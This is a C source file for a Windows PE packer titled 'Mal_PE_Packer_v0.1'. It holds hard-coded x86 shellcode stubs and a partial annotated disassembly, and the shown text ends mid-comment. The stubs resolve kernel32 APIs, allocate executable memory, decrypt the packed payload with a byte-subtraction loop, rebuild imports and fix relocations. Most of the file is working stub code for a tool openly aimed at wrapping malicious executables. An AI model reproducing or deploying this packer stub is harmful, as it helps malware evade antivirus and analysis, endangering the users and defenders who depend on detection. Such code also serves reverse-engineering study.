#include <stdio.h>
#include <string.h>
#include <winnt.h>
#include <Windows.h>

#define DEBUG 1
#define MAX_ENCRY_SECTION_COUNT 0x40

#define Main_Title()                                                  \
  printf("######################################################\n"); \
  printf("##               Mal_PE_Packer_v0.1                 ##\n"); \
  printf("##                                                  ##\n"); \
  printf("##                            Developed by nam3z1p  ##\n"); \
  printf("##                                         2020.07  ##\n"); \
  printf("######################################################\n");

#define Menu() \
  printf("\n[+] Usage : Mal_PE_Packer_v0.1.exe\n");

typedef struct _FILE_VIEW
{
  HANDLE hFileView;
  PBYTE pBaseAddr;
  DWORD dwFileSize;
  DWORD dwPEHeaderSize;
  DWORD dwNewPEHeaderSize;
} FILEVIEW, *PFILEVIEW;

typedef struct _ENCRYPT_DATA
{
  DWORD pEncryptDataBase;
  DWORD dwEncryptDataSize;
} ENCRYPTDATA, *PENCRYPTDATA;

typedef struct _PE_FORMAT
{
  PBYTE pBaseAddr;
  DWORD dwImageSize;
  PBYTE pExtraBaseAddr;
  DWORD dwExtraSize;
  PBYTE pNewImportTableBase;
  DWORD dwNewImportTableSize;
  PENCRYPTDATA pEncryptData;
  DWORD dwEncryptDataCount;
  PIMAGE_DOS_HEADER pIDH;
  PIMAGE_NT_HEADERS pINH;
  PIMAGE_FILE_HEADER pIFH;
  PIMAGE_OPTIONAL_HEADER pIOH;
  PIMAGE_SECTION_HEADER pISH;
  IMAGE_TLS_DIRECTORY ITD;
} PEFORMAT, *PPEFORMAT;

typedef struct _ORG_PE_INFO
{
  DWORD dwOrgEntryPoint;
  DWORD dwNewImportTableOffset;
  DWORD dwRelocTableRva;
  PBYTE pOrgImageBase;
  ENCRYPTDATA OrgEncryptData[MAX_ENCRY_SECTION_COUNT + 1];
} ORGPEINFO, *PORGPEINFO;

typedef struct _LOADSEG_ENCRYPT_DATA
{
  DWORD dwNewEncrytOffset;
  DWORD dwNewEncrytSize;
} LOADSEGENCRYPTDATA, *PLOADSEGENCRYPTDATA;

BYTE bShellSection_bootseg_Call[] = {0x60, 0xE8, 0xAD, 0x00, 0x00, 0x00};

BYTE bShellSection_bootseg_ImportTable[] = {0x2E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3E, 0x00, 0x00, 0x00, 0x2E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4B, 0x00, 0x00, 0x00, 0x5C, 0x00, 0x00, 0x00, 0x6F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4B, 0x65, 0x72, 0x6E, 0x65, 0x6C, 0x33, 0x32, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x00, 0x00, 0x47, 0x65, 0x74, 0x50, 0x72, 0x6F, 0x63, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x00, 0x00, 0x00, 0x47, 0x65, 0x74, 0x4D, 0x6F, 0x64, 0x75, 0x6C, 0x65, 0x48, 0x61, 0x6E, 0x64, 0x6C, 0x65, 0x41, 0x00, 0x00, 0x00, 0x4C, 0x6F, 0x61, 0x64, 0x4C, 0x69, 0x62, 0x72, 0x61, 0x72, 0x79, 0x41, 0x00};

BYTE bShellSection_bootseg_LoadData[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6C, 0x41, 0x6C, 0x6C, 0x6F, 0x63, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

BYTE bShellSection_bootseg_Start[] = {0x5D, 0x81, 0xED, 0x06, 0x00, 0x00, 0x00, 0x8D, 0x75, 0x3E, 0x56, 0xFF, 0x55, 0x32, 0x8D, 0xB5, 0x9E, 0x00, 0x00, 0x00, 0x56, 0x50, 0xFF, 0x55, 0x2E, 0x89, 0x85, 0xAB, 0x00, 0x00, 0x00, 0x6A, 0x40, 0x68, 0x00, 0x30, 0x00, 0x00, 0xB8, 0x7E, 0x00, 0x00, 0x00, 0x03, 0xC5, 0xFF, 0x70, 0x04, 0x6A, 0x00, 0xFF, 0x95, 0xAB, 0x00, 0x00, 0x00, 0x89, 0x85, 0xAF, 0x00, 0x00, 0x00, 0xB9, 0x7E, 0x00, 0x00, 0x00, 0x03, 0xCD, 0xFF, 0x71, 0x04, 0x50, 0xBB, 0x7E, 0x00, 0x00, 0x00, 0x03, 0xDD, 0x8B, 0x1B, 0x03, 0xDD, 0x53, 0xE8, 0x1C, 0x00, 0x00, 0x00, 0x55, 0x8B, 0x85, 0xAF, 0x00, 0x00, 0x00, 0x8B, 0xD5, 0x81, 0xC2, 0x29, 0x01, 0x00, 0x00, 0x2B, 0xC2, 0x89, 0x85, 0x25, 0x01, 0x00, 0x00, 0xE9, 0xFF, 0xFF, 0xFF, 0xFF, 0x55, 0x8B, 0xEC, 0x60, 0x8B, 0x4D, 0x10, 0x8B, 0x75, 0x08, 0x8B, 0x7D, 0x0C, 0xEB, 0x05, 0xAC, 0x2C, 0xCC, 0xAA, 0x49, 0x0B, 0xC9, 0x75, 0xF7, 0x61, 0xC9, 0xC2, 0x0C, 0x00};

BYTE bShellSection_loadseg_Start[] = {0xE8, 0x00, 0x00, 0x00, 0x00, 0x5D, 0x81, 0xED, 0x05, 0x00, 0x00, 0x00, 0x5A, 0xB9, 0x03, 0x00, 0x00, 0x00, 0x8D, 0x72, 0x2E, 0x8D, 0xBD, 0x43, 0x04, 0x00, 0x00, 0xFC, 0xF3, 0xA5, 0x8D, 0x82, 0x29, 0x01, 0x00, 0x00, 0x89, 0x85, 0x57, 0x04, 0x00, 0x00, 0x8B, 0x82, 0xAB, 0x00, 0x00, 0x00, 0x89, 0x85, 0x4F, 0x04, 0x00, 0x00, 0x8D, 0xB5, 0x5F, 0x05, 0x00, 0x00, 0x56, 0xFF, 0x95, 0x47, 0x04, 0x00, 0x00, 0x8D, 0xB5, 0x6C, 0x05, 0x00, 0x00, 0x56, 0x50, 0xFF, 0x95, 0x43, 0x04, 0x00, 0x00, 0x89, 0x85, 0x53, 0x04, 0x00, 0x00, 0x6A, 0x00, 0xFF, 0x95, 0x47, 0x04, 0x00, 0x00, 0x89, 0x85, 0x5B, 0x04, 0x00, 0x00, 0xB9, 0x40, 0x00, 0x00, 0x00, 0xB8, 0x40, 0x00, 0x00, 0x00, 0x8D, 0xBD, 0x5F, 0x04, 0x00, 0x00, 0xFC, 0xF3, 0xAB, 0x8D, 0xB5, 0x5F, 0x04, 0x00, 0x00, 0x8D, 0xBD, 0x5F, 0x04, 0x00, 0x00, 0x57, 0x56, 0xFF, 0xB5, 0x5B, 0x04, 0x00, 0x00, 0xFF, 0xB5, 0x53, 0x04, 0x00, 0x00, 0xE8, 0x58, 0x01, 0x00, 0x00, 0xBA, 0x2B, 0x02, 0x00, 0x00, 0x03, 0xD5, 0x8D, 0x52, 0x10, 0x8B, 0x02, 0xEB, 0x1B, 0x8B, 0xB5, 0x5B, 0x04, 0x00, 0x00, 0x03, 0xF0, 0x8B, 0xFE, 0x8B, 0x4A, 0x04, 0x51, 0x57, 0x56, 0xFF, 0x95, 0x57, 0x04, 0x00, 0x00, 0x83, 0xC2, 0x08, 0x8B, 0x02, 0x0B, 0xC0, 0x75, 0xE1, 0xBE, 0x2B, 0x02, 0x00, 0x00, 0x03, 0xF5, 0x8B, 0x76, 0x04, 0x03, 0xF5, 0x8B, 0x3E, 0xEB, 0x54, 0x03, 0xBD, 0x5B, 0x04, 0x00, 0x00, 0x83, 0xC6, 0x05, 0x56, 0xFF, 0x95, 0x47, 0x04, 0x00, 0x00, 0x0B, 0xC0, 0x75, 0x07, 0x56, 0xFF, 0x95, 0x4B, 0x04, 0x00, 0x00, 0x8B, 0xD0, 0x0F, 0xB6, 0x4E, 0xFF, 0x03, 0xF1, 0x8B, 0x0E, 0x83, 0xC6, 0x04, 0xEB, 0x24, 0x51, 0x52, 0x0F, 0xB6, 0x1E, 0x46, 0x0B, 0xDB, 0x75, 0x08, 0x8B, 0x1E, 0x83, 0xC6, 0x04, 0x53, 0xEB, 0x03, 0x56, 0x03, 0xF3, 0x52, 0xFF, 0x95, 0x43, 0x04, 0x00, 0x00, 0x89, 0x07, 0x83, 0xC7, 0x04, 0x5A, 0x59, 0x49, 0x0B, 0xC9, 0x75, 0xD8, 0x8B, 0x3E, 0x0B, 0xFF, 0x75, 0xA8, 0xBA, 0x2B, 0x02, 0x00, 0x00, 0x03, 0xD5, 0x8B, 0x52, 0x0C, 0x8B, 0x9D, 0x5B, 0x04, 0x00, 0x00, 0x3B, 0xDA, 0x74, 0x59, 0xBE, 0x2B, 0x02, 0x00, 0x00, 0x03, 0xF5, 0x8B, 0x76, 0x08, 0x0B, 0xF6, 0x74, 0x4B, 0x03, 0xF3, 0x8B, 0x3E, 0xEB, 0x41, 0x8B, 0x4E, 0x04, 0x83, 0xE9, 0x08, 0xD1, 0xE9, 0x83, 0xC6, 0x08, 0xEB, 0x2E, 0x33, 0xC0, 0x66, 0x8B, 0x06, 0x66, 0x25, 0x00, 0xF0, 0x66, 0xC1, 0xE8, 0x0C, 0x66, 0x83, 0xF8, 0x03, 0x75, 0x17, 0x33, 0xC0, 0x66, 0x8B, 0x06, 0x66, 0x25, 0xFF, 0x0F, 0x57, 0x03, 0xF8, 0x03, 0xFB, 0x8B, 0x07, 0x2B, 0xC2, 0x03, 0xC3, 0x89, 0x07, 0x5F, 0x83, 0xC6, 0x02, 0x49, 0x0B, 0xC9, 0x75, 0xCE, 0x8B, 0x3E, 0x0B, 0xFF, 0x75, 0xBB, 0x8D, 0xB5, 0x5F, 0x04, 0x00, 0x00, 0x8D, 0xBD, 0x5F, 0x04, 0x00, 0x00, 0x57, 0x56, 0xFF, 0xB5, 0x5B, 0x04, 0x00, 0x00, 0xFF, 0xB5, 0x53, 0x04, 0x00, 0x00, 0xE8, 0x37, 0x00, 0x00, 0x00, 0xB8, 0x2B, 0x02, 0x00, 0x00, 0x03, 0xC5, 0x8B, 0x00, 0x03, 0x85, 0x5B, 0x04, 0x00, 0x00, 0x89, 0x85, 0xCF, 0x01, 0x00, 0x00, 0x61, 0x68, 0xFF, 0xFF, 0xFF, 0xFF, 0xC3, 0x55, 0x8B, 0xEC, 0x8B, 0x45, 0x08, 0x03, 0x40, 0x3C, 0x0F, 0xB7, 0x48, 0x06, 0x66, 0x03, 0x40, 0x14, 0x83, 0xC0, 0x04, 0x83, 0xC0, 0x14, 0xC9, 0xC2, 0x04, 0x00, 0x55, 0x8B, 0xEC, 0x60, 0xFF, 0x75, 0x0C, 0xE8, 0xD9, 0xFF, 0xFF, 0xFF, 0x8B, 0xD8, 0x8B, 0x75, 0x10, 0x8B, 0x7D, 0x14, 0x33, 0xD2, 0xEB, 0x1B, 0x60, 0x8D, 0x04, 0x97, 0x50, 0x8B, 0x04, 0x96, 0x50, 0xFF, 0x73, 0x08, 0x8B, 0x43, 0x0C, 0x03, 0x45, 0x0C, 0x50, 0xFF, 0x55, 0x08, 0x61, 0x83, 0xC3, 0x28, 0x42, 0x3B, 0xD1, 0x75, 0xE1, 0x61, 0xC9, 0xC2, 0x10, 0x00};

BYTE bShellSection_loadseg_LoadData[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4B, 0x65, 0x72, 0x6E, 0x65, 0x6C, 0x33, 0x32, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6C, 0x50, 0x72, 0x6F, 0x74, 0x65, 0x63, 0x74, 0x00};

/*
.code

>BYTE bShellSection_bootseg_Call[]
pbootseg_Call_Base label dword
; ------------------------ bootseg ------------------------
7000  [60]   pushal
7001  [E8 AD 00 00 00]  call 70B3
assume call: _bootseg_start:

>BYTE bShellSection_bootseg_ImportTable[]
; ------------------------ bootseg import table ------------------------
; the adjustment will be done when installing the shell
pbootseg_ImportTable_Base label dword

; IMAGE_IMPORT_DESCRIPTOR structures
7006  [2E 00 00 00 00 00 00 00 00 00 00 00 3E 00 00 00 2E 00 00 00]  //bootseg_ImportTable  IMAGE_IMPORT_DESCRIPTOR  <<first_thunk - pbootseg_ImportTable_Base>, 0, 0, dll_name - pbootseg_ImportTable_Base, first_thunk - pbootseg_ImportTable_Base>
701A  [00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00]  //IMAGE_IMPORT_DESCRIPTOR  <<0>, 0, 0, 0, 0>

; IMAGE_THUNK_DATA structures
702E  [4B 00 00 00]  //first_thunk  IMAGE_THUNK_DATA  <<first_func_name - pbootseg_ImportTable_Base>>
7032  [5C 00 00 00]  //second_thunk  IMAGE_THUNK_DATA  <<second_func_name - pbootseg_ImportTable_Base>>
7036  [6F 00 00 00]  //third_thunk  IMAGE_THUNK_DATA  <<third_func_name - pbootseg_ImportTable_Base>>
703A  [00 00 00 00]  //IMAGE_THUNK_DATA  <<0>>

703E  [4B 65 72 6E 65 6C 33 32 2E 64 6C 6C 00]  // dll_name  db  'Kernel32.dll', 0

; IMAGE_IMPORT_BY_NAME structures
704B  [00 00 47 65 74 50 72 6F 63 41 64 64 72 65 73 73 00]  //first_func_name  dw  0  db  'GetProcAddress', 0
705C  [00 00 47 65 74 4D 6F 64 75 6C 65 48 61 6E 64 6C 65 41 00]  //second_func_name  dw  0  db  'GetModuleHandleA', 0
706F  [00 00 4C 6F 61 64 4C 69 62 72 61 72 79 41 00]  //third_func_name  dw  0  db  'LoadLibraryA', 0
; --------------------------------------------------------------

>BYTE bShellSection_bootseg_LoadData[]
pbootseg_LoadData_Base label dword
; ------------------------ bootseg load data ------------------------
707E  [00 00 00 00 00 00 00 00]  //pLoadseg_EncryptData  LOADSEGENCRYPTDATA  <?>
7086  [00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00]  //pTLS_Table  IMAGE_TLS_DIRECTORY  <?>
709E  [56 69 72 74 75 61 6C 41 6C 6C 6F 63 00]  //virtual_alloc_name  db  'VirtualAlloc', 0

; The address of VirtualAlloc API, just used in the boot segment
70AB  [00 00 00 00]  //virtual_alloc_addr_boot  dd  0

; The base address of the load segment after decryption
70AF  [00 00 00 00]  //ploadseg_Start_Base  dd  0

>BYTE bShellSection_bootseg_Start[]
pbootseg_Start_Base label dword
; ------------------------ _bootseg_start ------------------------
_bootseg_start:

; self-relocation
70B3  [5D]  pop ebp
; ebp is the base address of the boot segment
70B4  [81 ED 06 00 00 00]  sub ebp, 6
assume ebp: ptr pbootseg_Call_Base

; get the address of VirtualAlloc API
70BA  [8D 75 3E]  lea esi, dword ptr ss:[ebp+3E]
70BD  [56]  push esi
assume esi: ptr dll_name - "kernel32.dll"
70BE  [FF 55 32]  call dword ptr ss:[ebp+32]
assume call: kernel32.GetModuleHandleAStub()
70C1  [8D B5 9E 00 00 00]  lea esi, dword ptr ss:[ebp+9E]
70C7  [56]  push  esi
assume esi: ptr virtual_alloc_name - "VirtualAlloc"
70C8  [50]  push  eax
assume eax: ptr kernel32.GetModuleHandleAStub()
70C9  [FF 55 2E]  call dword ptr ss:[ebp+2E]
assume call: kernel32.GetProcAddressStub()
70CC  [89 85 AB 00 00 00]  mov dword ptr ss:[ebp+AB], eax

; allocate memory for the load segment
70D2  [6A 40]  push 40
assume 40: data PAGE_EXECUTE_READWRITE
70D4  [68 00 30 00 00]  push 3000
assume 3000: data MEM_COMMIT || MEM_RESERVE
70D9  [B8 7E 00 00 00]  mov eax, 7E
70D3  [03 C5]  add eax, ebp
assume eax: ptr LOADSEGENCRYPTDATA
70E0  [FF 70 04]  push dword ptr ds:[eax+4]
assume [eax+4]: data LOADSEGENCRYPTDATA.dwNewEncrytSize
70E3  [6A 00]  push 0
70E5  [FF 95 AB 00 00 00]  call dword ptr ss:[ebp+AB]
assume call: VirtualAlloc();

70EB  [89 85 AF 00 00 00]  mov dword ptr ss:[ebp+AF], eax

; decrypt the load segment
70F1  [B9 7E 00 00 00]  mov ecx, 7E
70F6  [03 CD]  add ecx, ebp
assume ecx: ptr LOADSEGENCRYPTDATA
70F8  [FF 71 04]  push dword ptr ds:[ecx+4]
assume [ecx+4]: LOADSEGENCRYPTDATA.dwNewEncrytSize
70FB  [50]  push eax
assume eax: ptr ploadseg_Start_Base
70FC  [BB 7E 00 00 00]  mov ebx, 7E
7101  [03 DD]  add ebx, ebp
assume ebx: ptr LOADSEGENCRYPTDATA
7103  [8B 1B]  mov ebx, dword ptr ds:[ebx]
assume ebx: data LOADSEGENCRYPTDATA.dwNewEncrytOffset
7105  [03 DD]  add ebx, ebp
7107  [53]  push ebx
assume ebx: ptr bShellSection_loadseg_Start[]
7108  [E8 1C 00 00 00]  call 7129
assume call:DecryptData()

; format a jmp instruction to the load segment
710D  [55]  push ebp
710E  [8B 85 AF 00 00 00]  mov eax, dword ptr ss:[ebp+AF]
assume eax: ptr ploadseg_Start_Base
7114  [8B D5]  mov edx, ebp
assume edx: ptr pbootseg_Call_Base
7116  [81 C2 29 01 00 00]  add edx, 129
711C  [2B C2]  sub eax, edx
assume eax: jmp ploadseg_Start_Base

711E  [89 85 25 01 00 00]  mov dword ptr ss:[ebp+125], eax

; ------------------------ _jmp_loadseg_start ------------------------
_jmp_loadseg_start:
; jmp to the loadseg
7124  [E9 FF FF FF FF]  jmp 7128

; ------------------------ DecryptData proc ------------------------
DecryptData proc  src: dword, dest: dword, count: dword
7129  [55]  push ebp
712A  [8B EC]  mov ebp, esp
712C  [60]  pushal
712D  [8B 4D 10]  mov ecx. dword ptr ss:[ebp+10]
assume ecx: data count
7130  [8B 75 08]  mov esi. dword ptr ss:[ebp+8]
assume esi: data src
7133  [8B 7D 0C]  mov edi. dword ptr ss:[ebp+C]
assume edi: data dest
7136  [EB 05]  jmp 713D
[loop]
7138  [AC]  lodsb al, byte ptre ds:[esi]
7139  [2C CC]  sub al, CC
713B  [AA]  stosb byte ptr es:[edi], al
713C  [49]  dec ecx
713D  [0B C9]  or ecx, ecx
713F  [75 F7]  jne 7138
[loop end]
7141  [61]  popal
7142  [C9]  leave
7143  [C2 0C 00]  ret C
DecryptData endp
; ------------------------ DecryptData proc end ------------------------
; ------------------------ bootseg end ------------------------


>BYTE bShellSection_loadseg_Start[]
ploadseg_Start_Base label  dword
; ------------------------ loadseg ------------------------

0000  [E8 00 00 00 00]  call 0005
_next:
; self-relocation
0005  [5D]  pop ebp
; ebp is the base address of the load segment
0006  [81 ED 05 00 00 00]  sub ebp, 5
assume ebp: ptr ploadseg_Start_Base

; edx is the base address of the boot segment
000C  [5A]  pop edx
assume edx: ptr pbootseg_Call_Base

; copy some data of the boot segment to the load segment
[loop]
000D  [B9 03 00 00 00]  mov ecx, 3
0012  [8D 72 2E]  lea esi, dword ptr ds:[edx+2E]
assume esi: ptr first_thunk
0015  [8D BD 43 04 00 00]  lea edi, dword ptr ss:[ebp+443]
assume edi: ptr get_proc_address_addr
001B  [FC]  cld
001C  [F3 A5]  rep movsd dword ptr es:[edi], dword ptr ds:[esi]
[loop end]

001E  [8D 82 29 01 00 00]  lea eax, dword ptr ds:[edx+129]
assume eax: ptr DecryptData proc
0024  [89 85 57 04 00 00]  mov dword ptr ss:[ebp+457], eax
002A  [8B 82 AB 00 00 00]  mov eax, dword ptr ds:[edx+AB]
assume eax: data virtual_alloc_addr_boot
0030  [89 85 4F 04 00 00]  mov dword ptr ss:[ebp+44F], eax

; get the address of VirtualProtect API
0036  [8D B5 5F 05 00 00]  lea esi, dword ptr ss:[ebp+55F]
assume esi: ptr kernel32_name - "Kernel32.dll"
003C  [56]  push esi
003D  [FF 95 47 04 00 00]  call dword ptr ss:[ebp+447]
assume call: kernel32.GetModuleHandleAStub()
0043  [8D B5 6C 05 00 00]  lea esi, dword ptr ss:[ebp+56C]
0049  [56]  push esi
assume esi: ptr virtual_protect_name - "VirtualProtect"
004A  [50]  push eax
assume eax: ptr kernel32.GetModuleHandleAStub()
004B  [FF 95 43 04 00 00]  call dword ptr ss:[ebp+443]
assume call: kernel32.GetProcAddressStub()
0051  [89 85 53 04 00 00]  mov dword ptr ss:[ebp+453], eax

; get the actual base address of the PE image after loading
0057  [6A 00]  push 0
0059  [FF 95 47 04 00 00]  call dword ptr ss:[ebp+447]
assume call: kernel32.GetModuleHandleAStub()
005F  [89 85 5B 04 00 00]  mov dword ptr ss:[ebp+45B], eax

; set the protection of sections
[loop]
0065  [B9 40 00 00 00]  mov ecx, 40
assume ecx: data MAX_ENCRY_SECTION_COUNT  equ  040h
006A  [B8 40 00 00 00]  mov eax, 40
assume eax: data PAGE_EXECUTE_READWRITE
006F  [8D BD 5F 04 00 00]  lea edi, dword ptr ss:[ebp+45F]
assume  edi: ptr section_protections
0075  [FC]  cld
0076  [F3 AB]  rep stosd dword ptr es:[edi], eax
[loop end]

0078  [8D B5 5F 04 00 00]  lea esi, dword ptr ss:[ebp+45F]
assume  esi: ptr section_protections
007E  [8D BD 5F 04 00 00]  lea edi, dword ptr ss:[ebp+45F]
assume  edi: ptr section_protections
0084  [57]  push edi
0085  [56]  push esi
0086  [FF B5 5B 04 00 00]  push dword ptr ss:[ebp+45B]
assume  [ebp+45B]: ptr pe_image_BaseAddr
008C  [FF B5 53 04 00 00]  push dword ptr ss:[ebp+453]
